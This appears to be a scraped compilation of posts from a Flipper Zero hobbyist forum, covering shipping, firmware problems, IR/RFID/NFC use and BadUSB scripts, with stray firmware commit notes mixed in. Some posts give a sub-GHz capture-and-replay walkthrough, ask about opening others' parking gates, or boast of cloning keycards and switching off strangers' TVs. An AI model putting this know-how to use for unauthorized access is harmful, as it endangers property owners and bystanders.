That being said, I recently got my flipper and flashed it to 0.56.1. I took it around a local campus just to test the IR TV database and found it had a success rate of about 5% for turning the various TV models off. LG was the only manufacturer that seemed to work. I understand its a new device so naturally the database would be in development but I guess I expected a bit more at this current stage.

My real question is if perhaps its user error. Is the IR sensor on the flipper range limited? I found I had to be /quite/ close for it to work. Otherwise, are people mainly using databases from GitHub? I saw one or two pop up on this subreddit and curious what others successes have been.

Tried scanning a hotel keycard as I regularly travel and was under the impression that I could store NFC key cards and pull them back up to use them as I routinely lose them or have many at once and was shown in the Kickstarter trailer and.......no dice. 

Saves the card, but won't unlock the door. Yet another feature I was super interested in that doesn't work/isn't ready after 18+ mo.....?

Really hope this functionality is on the way otherwise I might have a post for r/FlipperSales soon  Hopefully I'm doing something wrong??

Hey, it looks like i'm in the final stages, my address was locked and i'm just waiting for shipping notification. Just curious if there are a lot of US folks still waiting or they're mostly all shipped out now?

I've been periodically, passively monitoring this subreddit and continually see the same questions asked that can be easily answered by quickly browsing a dirth of communal discussion. This subreddit is 60% "got my tracking number/ device," 20% "can the Flipper do X," and 20% "where can I find good links for my device?"

It's all right there on discord. How in the fuck are you guys discussing the latest technological devices and expecting to learn in leaps and bounds via forum style discussion? Just fucking search the discord. Firmware limitations, current capabilities, information on SD cards, GitHub repositories, user interface, customization. 

People on the discord are discussing ISM bands, OOK, ASK, De Bruijn sequencing, modulation, NFC chipsets, CSV files, etc.

This is an excerpt from the discord: "Classes are just structs and methods are just functions that have an invisible pointer to a struct and polymorphism is just casting."

This is an excerpt from the subreddit: 

"I've tried to clone the Tesla Key card, but it's smart enough to block replays.  
Which is a good thing."

"How did you read it? I tried to read it as RFID and NFC, it did not work."


Jesus Christ. It's not a fucking magic wand. You don't wave your Flipper over a Tesla and rhythmically chant "NFCRFID!" 

If you want quick, dense, credible information, stay off the subreddit, get on the discord server, you fucking Cro-Magnon.

Hi everyone!

Im  a software engineer by trade with no re experience in pen testing or cracking. Closest I got was running wire shark a few times and getting confused. 

What are some good and resources to get started? I tried scanning my car keys and learned rolling keys make that not so useful. 

The docs do a good job of telling me how to find the functionality, but I dont really know *what* to do with it just yet. 

Really excited for some supplementary docs and project ideas. Thanks!

Kinda random, but certain NFC (amiibo - yeah, I know...) features that were working on the previous firmware won't work now on this update. When I revert back to the previous firmware it begins to work again, but won't on the newest. I was just wondering if anyone knows what that's about and how to potentially correct it.

I started to play around with this guy right out of the box of course after I update the firmware. 

Somehow between trying to duplicate my car key fob, i have since deactivated my car key fob. I have a back up with the Fob information, however none of the buttons work, it will still start the car. While learning with a new device, make sure if you're playing with other expensive tech, something can always go wrong.

Question to the dev team, custom FW devs, and community.

We are all loving our flippers however; we are still lacking the DUMB mode that was supposed to turn him into tamagotchi when needed. 

Is anyone working on such FW? If so, is it going to be awhile due to bugs or are we close to seeing our digital friend becoming even more cooler?

Hey weird question. With COVID dying down and travel increasing, I'm reading more and more about hidden cameras or weird hidden stuff in hotel rooms and AirBnB places.

I also see these sweepers that apparently work well (on Amazon) for like, $500.

Question: using the suite of sensors on the flipper, could we cobble together a scan feature that's low enough power that it's legal, but sensitive enough to scan for and detect illicit devices?

So, I've been poking around the firmware sources, and I see that there is a Command Line Interface (CLI), even with sweet little Flipper ASCII art!  I wonder how I get access to it, though.  Do I need to use the GPIO ports, or can it be accessed over USB?  I can't see anything about it in the macOS version of the qFlipper app.  Anyone found that CLI yet?

Received my flipper zero a few days ago, and upon first power-on I noticed there was a blank/dead line on the screen. Im almost certain its a problem with the board-mounted part of the ribbon that connects to the screen, but I cant seem to get the back off to check; has anyone else had this issue?

&gt; **Pre-order codes have expired on February 28th. There is no way to buy Flipper Zero right now. Stay tuned and don't miss live sales that are coming soon.** 

I'm checking out the project after about a year - please fill me in - what is the current problem? I see that the project is funded (over $4M), I see people posting about receiving their devices, yet when I go to the webpage there is no clear way to order a device as you would with other hardware..

What's the holdup? Why are people waiting dozens of months to get their devices? I'd like to order but waiting 20-ish months for it to arrive is ridiculous, unless they are hand crafting it from mineral rocks.

Thanks!

I found a pretty great fitting soft case for the Flipper Zero, with or without the silicone jacket. 

It comes in a variety of colors and it's $10 on Amazon. It's designed for the Apple Magic Mouse, but fits the flipper pretty much perfectly when zipped up. 

Here are some pics: [https://imgur.com/a/Z8vB3uo](https://imgur.com/a/Z8vB3uo)

I've just received my flipper zero and I'm trying to hack anything that's mine (no mischief... yet). So far I've captured a few of my tv remote functions, I got my key card for work saved and my debit card. I'm having trouble getting my car key fob to be a thing, but probably because I don't know the modulation to properly clone it. I was expecting more interaction with the dolphin, Ildeli (I wonder if others have different dolphin names, or if everyone has Ildeli?) since I think I'm giving the device a lot of info. It would have been cool if Ildeli commented something like "That's the first thing we've hacked. Now let's do more!" or something?

To my knowledge you are only able to edit the hex of a device which is not what I am looking for. I am attempting to edit the color of kyber crystals from disney but editing the hex only allows me to write hex to the specific crystal rather than being able to change the IDs and therefore their color. I don't really know how to explain this but I would like to be able to use the flipper as a RFID writer rather than just a hex editor.

Hey all!  Well, my flipper has finally arrived, and I'm delighted.  I'm interested in exploring some minor development on it, and in particular was looking at trying to get samyk's [opensesame](https://github.com/samyk/opensesame) attack working.  As the code is all there on github, and his device used the same RF chipset.  I presume it should be a relatively simple matter to get it going on the flipper, but not quite sure how to start with it, as I guess the dev docs are still only in Russian...  


Is anyone already working on getting this particular attack installed, or has done so?  Or any advice on how to get started?
-------------------------------

I'm having a connection problem - two brand new Flipper Zero units, both units can power up just fine, both can do the updating-reloading firmware phases in qFlipper just fine, both units "see" their SanDisk microSDs just fine ( and show nice fast speeds in Setup&gt;Storage&gt;Benchmarking), and even can be connected to by "minicom -D /dev/ttyACM0 -b 115200" which gets to the CLI console (which is kinda a fun place, kudos you folks!)... but they both error out when connected in non-DFU mode and show as "INVALID DEVICE" in qFlipper. As you might expect, the screen shows "No Database Found. App Functions may be reduced" a lot.

Hard-setting by holding "left" and "back" get both Flippers into DFU mode and they can update the firmware in qFlipper, BUT once in DFU and completing the reload-firmware phase in qFlipper, neither one can get past the end of "reloading firmware" -- the qFlipper process errors out with the following (cut and pasted)

`[REG] Detected new device: VID_0x483:PID_0x5740`  
`[REG] Device initialization failed: Failed to find a suitable serial port`  
`[RCY] Correct Option Bytes u/Windlun ERROR: Failed to write corrected option bytes: Operation timeout`  
`[DEV] Full Repair u/Windlun ERROR: Failed to write corrected option bytes: Operation timeout`  
`[BKD] Current operation finished with error: "Failed to write corrected option bytes: Operation timeout"`

OS is Debian Testing, up to date as of 12 noon on 23-April-2022, the user is in group "dialout", and as noted above, there's no problem getting to /dev/ACM0 via Minicom so it's really puzzling me. This behavior is consistent with qFlipper 1.0.1, 1.0.0, and 0.9.3 . All USB devices except for the mouse, the keyboard, and the Flipper Zero have been unplugged.

Behavior is identical between the two units, so it's probably not a bad hardware unit.

What should I try  next (or even "it works for me on Debian Testing")?

Got my flipper today. Firmware was 0.43.1, which was too old to work with the app and didn't have any device libraries or other stuff, so I tried to update. 0.55.1 and 0.56.0rc installed fine, but had "Unsupported radio stack" errors on boot and bluetooth didn't function. Downgrading to 0.43.1 brought it back to "working" condition. I then tried using one of the "updater" dfu's rather than a "full", and now... nothing. Screen blank, LEDs dark, no response at all. Is there any way to fix this or do I just have more electrojunk to landfill?

I got the conformation email and then a tracking number on the 6th, but its still sitting in the warehouse two weeks later. 

Can someone who has received theirs give me some idea of the timeline they experienced? How long did it sit in the warehouse before shipping? How long after shipping did it take to get to you?

Thanks!

ive been getting lots of flipper zero content on tiktok and wanted ask a question to here. 
the city i live in has awful downtown parking but its full of apartment outdoor parking lots that are mostly empty. they all have the one arm coming up and down gates or the rolling away metal gates. all seem to work with a simple remote. my compound garage door also opens with a similar remote.

my question is if i were to buy the flipper would i need the original remote to all these apartment lots to copy and emulate or can the machine like scan or try a bunch i frequencies to open the gates for. almost like a universal/master key type situation. 

if the answer is no do yall know any electronic master key solution for me? thank youuu

Hey Flipper community, I pre-ordered a Flipper Zero (white) on Kickstarter a long time ago and it finally arrived, but I don't really have a use for it anymore. I tried selling it on eBay a couple weeks ago but my post was taken down by moderators. The Flipper Zero is new, sealed, and never opened. Asking $400, but will accept the best offer between now and next Sunday (April 24). Free shipping within the US.

Pretty much title. Ive received three emails saying asking to confirm/ change if necessary my shipping address over the course of the last 2 months.

I'm kinda new to this so pardon my ignorance but when I was looking at the badusb demo that came with the flipper it looked like it was a basic txt file and I found a folder online full of payloads that were txt files as well but the flipper didn't even try to open them when I selected them? I don't understand what I'm doing wrong if anything

Still waiting on mine to confirm as shipped, but was curious for those who have theirs if you can record several infrared commands into one replay.

I was just curious if it's even theoretically possible to read the RFID tag in my passport. I tried scanning all around my wife's new (USA) passport with the flipper but couldn't find any signal. I saw something online about how it may be a high frequency tag? I'm super new to learning about how these frequency tools work.

Hey everyone 

I noticed you can both scan with the universal remote function and copy individual keys directly from a remote to save them manually. 

Concerning the former. 

Is there a way to swap out the keys that are preprogrammed (PWR, VOL/CH +/- and Mute)? Specifically to replace "Mute" with a "source/input" key on the Flippers base remote without having the original TV remote?

Thanks

Hey guys! I remember seeing the product on kickstarter like 2-3 years ago and bought it just for the fun of it with a very figure it out later attitude.

I saw an interesting video on YouTube where an individual has a flipper zero and they use it to turn on their Xbox One. [flipper used to turn on Xbox One](https://m.youtube.com/shorts/drcEkZ6mCcM)

I'm currently running a repetitive in a game on my Xbox One. If I could automate this grinding process I would be extremely happy.

If I could record the commands I send to my Xbox through the controller and save them to a macro that was played back with the appropriate delays I would be extremely happy.

Is there a way to record the commands for my Xbox which are transmitted wirelessly with my flipper zero and then play them to my Xbox one?

1.	The orange silicone case is very stylish, but it makes it easy to spot and hard to quickly slip in and out of pockets. Im taking the case off and buying a lanyard that locks around the wrist
2.	The white flipper looks cool but again, it is very easy to spot.
3.	The orange backlight makes it glow if you try to partially hide it in your jacket sleeve.
4.	The TV ir remote database is hilariously fun and im loving all the mild inconveniences im causing around town
5.	Ive stored multiple remotes in it, and this functionality is legitimately convenient. If you think about it, unless youre channel surfing, you really only use a few buttons on your remotes anyways.
6.	Most of the wireless protocols used in my area (Midwestern United States) are not vulnerable to replay attacks, making it more difficult to use the other functions of the device.

    * Wrap width is 120 pixels, not 140. (140 is larger than the screen!)
    * Glyph width already includes spacing; don't add 1 additional px
    * When starting a new line, include wrapped glyph width in new line_width.
    * Call canvas_set_font before text_box_insert_endline so that glyph
      width is calculated using correct font.
      Previous approach worked somewhat well using default TextBoxFontText but
      this version is more robust, particularly when using TextBoxFontHex.

    * When opening a DESFire card from Archive, retain UID emulation behavior
    * rm unnecessary \r\n
    * show Popup instead of leaving view in bad state
    * Move NfcReaderRequestData out of union
      This makes it safe to emulate DESFire/EMV without clobbering card data.
    * Display saved DESFire cards via NfcSceneDeviceInfo
    * Display and save file metadata even when contents are missing
      This can happen when a file doesn't allow unauthenticated reads (see the
      call to mf_df_parse_read_data_response in nfc_worker.c).

I would like to edit the badusb capabilities of the flipper but don't know where to start. I want to be able to send keyboard inputs with the flipper without using ducky script. And I want to be able to receive keyboard led light changes such as caps lock, num lock, and scroll lock. I can do this in python or bash and have it work on a raspberry pi but I'm unsure of how to work with the flipper firmware.

Howdy Flipperoonies,

I was wondering whether an SDK is in the works for FZ?

Basically I would love the ability to write a custom application that would appear under my own menu item that will allow me to make a Tetris/Breakout game or something to execute an Arduino sketch for example.

Is this something thats in the works? Im happy to fork the firmware and just modify it on my own but I was wondering whether an SDK will be released soon.

Thanks in advance!

Kickstarted this thing and have had some fun with it.  Shut off an annoying TV at my gym, spoofed a couple of access keycards, even unlocked my car (be careful with this one.)

None of the number row special characters work on BadUSB when plugged into Chromebooks (!@#$%\^&amp;\*())

Does anyone know if it is possible to read the contents of the chips they tag animals with? In Europe, they operate on **125-134,2 Khz** frequency. I remember hearing some rumors from a Flipper Zero hackathon that someone was able to do that, but couldn't find any details.

I have a project that intends to help with identifying stray cats and wanted to use Flipper as a portable scanner for that purpose.

Any information will be appreciated

I'm trying to pick up the RF used by the gate to my building's parking lot. A year ago, I was able to clone it with a $20 "universal remote" from Amazon, so I'm pretty sure it's not using a rolling code or anything similar. The cheapo remote says it covers 280-868 MHZ.

Obviously I could pop open the remote, or look it up by its FCC ID, to see what parts it uses, and from that I could probably find out what band and modulation it uses. But if I were doing a real pentest I probably wouldn't have the real remote. (That said, I did look up my remote and I'm pretty sure it's 315MHz.)

Using the stock firmware I've tried literally every combination of settings, and my Flipper Zero stubbornly refuses to pick up the RF from my remote. I know the remote works because I can see the gate opening.

What am I doing wrong? In this case, I know that the remote is on a band supported by Flipper, but it can't pick up the signal. And in a real scenario, how would I proceed when I don't even know what band to look at?

This one is for the Star Wars nerds, especially those who have been to Galaxy's edge! If you're  familiar you'll know that the Kyber crystal is RFID, that's how (from my understanding) the lightsaber knows the color, voice, and sounds to make. Do you think it would be possible with the read an emulate feature to be able to create a repo and be able to change your Saber at will? Recent talk about the amiibos get me thinking.

Coming from the Arduino community, I purchased a pack of proto boards. I'm not sure what's the best way of using them. Building a temperature sensor doesn't seem all that useful. The Flipper Zero WiFi support seems a bit limited. Maybe I could build a more powerful IR transmitter. Any ideas?

The notes implied that any decent micro-SD would be fine. Between phones, cameras, music players, and computers I've got stacks of micro-SDs around. I struggled for the first 12 hours. 

After analyzing the log notes I realized that the problem was with the micro-SD. Use the best, non-counterfeit, 16GB micro-SD you have.

and put them into first the root of the infrared folder (the renamed irda folder so that the mudhopper firmware works) and then into the assets folder inside infrared but neither location worked in that, although they now show up under /infrared/saved remotes, when you select one the screen goes blank for about 2s then bounces back to the main menu.  


then i renamed infrared back to irda and repeated these steps with the same results. what am i missing?  tks, /guy

Hello all, 

I'm playing around with ducky scripts to try out some bad USB payloads on my own computers, but every time I try to run a script, it keeps saying error on line \[w/e line # the first time ENTER appears on\]. These are just basic things too, like:  


DELAY 1000  
GUI r  
STRING mspaint.exe  
ENTER  


or something like that, very basic scripts, including a "hello world"

It'll stop working when ENTER pops up. I'm very new to bad USBs in general and this is the first experience I have playing around with the scripts, so if anyone has any ideas or advice, let me know! The scripts that came with the Flipper Zero work just fine!

I received my device on the weekend, however I don't need it anymore. I think it's been couple of years since I placed an order. Flipper support team recommended to sell it on ebay or Craigslist, instead of returning, so I tried to sell it on ebay. Listing went smoothly, data and details were already there\*. After 30 hours of being on ebay and quite successful bidding, I received this message: 

Please understand that you listed flipper one **\[not flipper zero\]**, which isn't permitted on eBay as such items can be used for or encourage illegal activity. Please don't relist such items on the site.

What you need to do next

You can't relist items we've ended. Please ensure your current and future listings follow this policy.

What is the policy

Items or information that might enable or encourage illegal activity are not allowed. Examples include:

\- Kill switch-activated electronic devices, including smartphones and tablets  
\- Items that can enable illegal activity, such as:   
\- pill presses  
\- blank rain checks  
\- selling USPS shipping materials  
\- products designed to fake the results of drug tests  
\- Information on how to use or make illegal drugs, bombs, or explosives  
\- Lock picking tutorials

I don't see any way to argue with ebay, they hide their support chats/emails/phone numbers somewhere deep and I doubt that it would be possible to convince them that it's legal. I chose everything ebay recommended me (\*package size, weight, bidding, starting price, etc.), which means they had some statistics already.

Anyone had the same issue? What platform do you think I can use?

I backed this as soon as I saw it on Kickstarter and have been perpetually telling myself that I'm going to learn more about this, but eventually got stuck as the delays piled on.

Now the wait is over and I'm going around with this beautiful device, trying to use the brute force remote, trying to scan every NFC/RFID I can find... and I keep coming to the realization that it's not just scan and repro.

My real use case for having this is to learn RF protocol and just generally understand this unseen world around me.

Does anyone have any recommendations for resources to understand the protocols and technologies in common use and supported by said Flipper?

I received the Flipper as a gift but, honestly, I don't have the know-how to use it to its potential. I saw eBay and a few other sites are removing postings due to the Flipper being "malicious."

I'm excited about this toy and want to deep dive in every section. I'm hoping to find people to share experiences and results with. 

So I have two RFID tags to test with. One is a stiff card, and one is a fob. Both are LF. I know this because I cloned the fob myself using a Proxmark, and it works as a daily access device.

The card is recognized instantly by a Flipper read. The fob doesn't seem to recognize at all. 

I have a Dangerous Things RFID Diagnostic card, it doesn't light up at all when placed around the Flipper in RFID read mode. Is the Flipper just a very weak reader? I'll see if I can dig up some more cards for testing. I also can't find my Proxmark right now, which is hampering my curiosity a little bit.

Got my Flipper two days ago - yay! and charged it up, no problems there. Updated the firmware successfully, and then played with it for a few minutes (couldn't do much as I didn't have an SD card for it at the time). After I was done I successfully powered it off - two days later now I can't turn it back on, not even when plugged in - light doesn't turn on when plugged in either (is it supposed to?). Seems like the thing is bricked? Anyone have an ideas what I should do?

I cannot get the update software to recognize the device on any computer. When I connected via USB it charges, so I'm sure the USB works.

I've tried unmounting and reformatting the SD as well. Any ideas?

I have an RF controller for an LED light, and when I run the Frequency Analyzer it reads varying  frequencies between 433.829 to 433.879. Is this an issue with the analyzer or is the remote actually changing broadcast frequency? Any way to send commands at this frequency?

Just got it today and wanted to start using it so I decided to try it out on a few different things:

&amp;nbsp;

TV: Tried to replace my TV remote with it. Problem was, the IR receiver on the Flipper would only pick up the power button. And ONCE it picked up the volume up but I couldn't repeat that. No other buttons were picked up. Thought my remote might've been defective (chewed on by new puppy) but the volume down key was being detected by the TV even though the Flipper wasn't detecting it. Turns out that's because my TV/remote is Amazon Fire and it works mainly through bluetooth. But no way would the remote rely solely on bluetooth when it was perfectly capable of IR right? Maybe the remote will fall back to IR only if it isn't paired with any bluetooth device. So a quick google search later and I found out how to unpair the remote from bluetooth and suddenly my Flipper was picking up the IR codes for all the buttons! And the tv was more than happy to accept the IR codes instead of bluetooth even when I reconnected the remote.

&amp;nbsp;

Lights: My living room light is controlled by a wireless switch on the wall. Thought it might be IR too but that didn't pick up anything. So I decided to use the Sub-GHz antenna to see if that picks up anything. On the default settings under Read RAW it got nothing. But that's searching 433.92 Hz with AM650 modulation. Using the Frequency Analyzer I found out that the light switch sent out a frequency of 315 Hz so changing that under Read RAW got a signal. Signal was read and repeated with success whether it had a modulation of AM270 or AM650 but didn't work with FM238 or FM476. Did some reading and it's similar to AM vs FM radio. And I assume the numbers simply refer to the "station". The frequency analyzer didn't show whether it's AM/FM but I assume it can pick up on both and just expects you to know which (I have no other sub-ghz devices to test with).

&amp;nbsp;

Car key fob: lol not a chance. I assume the signals are somehow unique and using rolling codes so old ones won't work. Tried capturing the signal out of range of the car and replaying it closer but no success. Maybe some old early versions of remote entry car key fobs are less secure but I've only got access to an '07 and '09 vehicle.

&amp;nbsp;

Bad USB: Works great! Connected the Flipper to my pc through usb, opened up notepad, and it typed out a nice little ASCII dolphin. Put the sd card into my pc and looked at the code and it looks simple enough to write your own scripts. Also works with ducky script it seems. Might have to try writing my own script to emulate USB as well instead of just a keyboard. Then that makes copying files to/from the target computer a breeze.

&amp;nbsp;

Phone: NFC detects my phone but I don't have any NFC payments or anything else on there so can't test it further.

&amp;nbsp;

Credit/debit card: Picks it up and displays the card number and some additional info such as expiration date. Haven't tried to pay with it yet though.

Anyone tried scanning their pets Microchips?
Will the flipper work?

The good news is that across all of the many brands there are only three frequencies of microchip The three frequencies are 125 kHz, 128kHz, and 134.2 kHz. While the lower frequency chips used to dominate the U.S. market, nearly all manufacturers have now switched to the 134.2 kHz chip, which is the international (ISO) standard.

I'm pretty stoked that mine is coming soon, but if you're receiving yours can you share which counter you are in? This will help gauge which region the flipper guys are shipping to next

A local waterpark ([Great Wolf Lodge](https://www.greatwolf.com/minnesota)) sells kids wands for $20 that activate light / motor / sound art pieces around the park. 

I observed that the wands had to be pointed at the art pieces, so that tipped me off that IR was the technology behind the effect (as opposed to radio, which would have been set off by proximity).

I got the Flipper Zero out &amp; captured 112 samples with the IR feature.  Replaying triggered the art piece activations!

But, when I tried an hour later, the art pieces all played a sound saying that I'd already triggered the effect, suggesting that the wands have some notion of time?

Got my Flipper yesterday, and I would like to get started writing plugins, but I can't find any information about it aside from a 30 second youtube clip that provided just the idea that it is possible.

Does anyone know where I can find out about APIs and any developer tools (I think I heard a VS Code extension mentioned)?

I see references to it on their blog from years ago, and there's a script-list on the Russian documentation site, but no indication of how to load them / where they belong on the SD / what filename / etc. 

Oddly enough, I got the unit flashed with the RC firmware and it says "databases present", but nothing happens when navigating to Universal Library -&gt; TVs.

Hey y'all, for the folks who have received your Flippers, have you had any trouble reading RFID cards? I've got two cards and a keyfob I've been testing with and my Flipper hasn't been able to read any. At first I was worried there was an issue with the antenna hardware, but I am able to read NFC cards without issue. I'm trying to figure out if I'm doing something wrong or if there's a problem with my device.

Here's a short vid I took trying it out: https://www.youtube.com/watch?v=cbBaJUPxz64

Just a quick and simple tutorial to help new users.

Under the "Sub-GHz" menu, select "frequency analyzer" at the bottom. Push the button on the key-fob that you would like to store. The appropriate frequency will flash briefly. Using this info, go to "Read RAW" under the "Sub-GHz" menu. Configure the frequency to the correct setting. You most likely don't have to adjust modulation. Hit "REC" and push the button on the key-fob. If successful, you will see a corresponding reading on the graph. Hit "Stop". Hit "Send" to confirm that it works. Then hit "save" and you're good to go!

Device arrived.  Won't charge.  Says charged but as you can see 0%.  Pull the USB cord and its dead.

Also all [flipperzero.one](https://flipperzero.one) pages faq/contacts/update are not responding on any device - are they overloaded with traffic ???

I backed the Flipper Zero on Kickstarter, and when the BackerKit surveys went out, I selected a black case for my Flipper. The email that went out on Sunday mentioned that all Kickstarter orders are shipping, but I haven't gotten a notification, and judging by a couple comments in recent threads, it sounds like I'm not the only one to have picked a black Flipper who isn't receiving their order yet.

Does anybody else know more about this situation?

What are some things you want to do with Flipper? I would love to farm some ideas from everyone. Hive mind!

Please keep all the pre-order code related requests and offers in this thread.

Also, please keep in mind that we plan to have retail Flippers available in spring.  


Do use common sense if you decide to buy a code from a pseudonymous somebody on the internet.   
We won't be mediating any deals and will not accept any support requests regarding "The pre-order code I got on reddit doesn't work". 

All pre-order codes begin with FZP-\* the first digit marks the number of Flippers pre-ordered that have to be purchased in a single order.   
For example FZP-07-12345-WEFLIP will only work for 7 devices in one order.  


Be nice, mark the codes you grabbed and/or the codes you're no longer offering.

I was driving back from work on Saturday when I got a text that required me to do a Google search. I don't text and drive let alone do searches so I decided to pull over. Even though I could have parked on the street I decided to pul into a quiet and shady parking lot in an apartment complex. After sitting in my car for about a minute I realized the parking lot had a gate and it began closing. 30 minutes later and I'm still stuck in this lot and I start to panic. No way is my GF going to believe that I was in the parking lot of some random apartment building for the reasons I provided. I exit the car and begin to examine the gate, hoping to find a lever or switch to open it manually. Finally some straight-laced dude starts walking to his car and notices me acting suspiciously around the gate. I smile at him and walk towards my car. He totally thinks Im a scumbag and decides to see what I do first. For another 10 minutes we are each in our cars, him waiting on me, and me acting cool just looking at my phone. Finally he starts pulling out of his space and slowly drives through the gate, probably ready to stop if I move so I wait till the last possible moment. As soon as my car can clear the gate, I pull out of my space as the gate is halfway closing and I barely make it out without causing any damage. Straight-laced homeboy is now staring at me hard and I quickly drive away. I really wish I could have hacked my ass out of the parking lot a whole lot sooner!

To preface, I'm definitely getting a flipper Zero, and can't wait.

The question is, are there any alternative multi-tools for pentesters and geeks you would recommend to look at while we wait? I doubt anything will compare to the Flipper Zero, but what can those of us waiting take a look at in the meantime?   


Perhaps are there any predecessors to the flipper zero that are available and compact?

I asked this question before the campaign ended and it brought up some good points and hope that this had the potential to be a crypto hardware wallet also.  


Now that the campaign has ended and we are getting closer to receiving our flipper zeros, does anyone know the likelihood of creating a hardware wallet program for this? id love to be able to store, and transfer coins on this device.

If they are adding it to the flipper one why can it not be added to the flipper zero? Id be more than happy to pay a little extra.

Think of the possibilities with wifi around the home with hubs and home networks such as Google or Alexa. 

Im sure the budget they have now from the kickstarter will be able to support such changes to add a wifi module.

When I saw the FlipperZero and of course the infamous intro, I simply had to back this project! In turn, my son also wanted one. I just got the email about the added sd too! You people's rock!

I can't wait to try this thing out. I'm in the process of figuring out what I will test first! I am finding this quite difficult. Too many choices. Too many options. Lol

Thanks again to the teams responsible. Looking forward to see this project come to life.
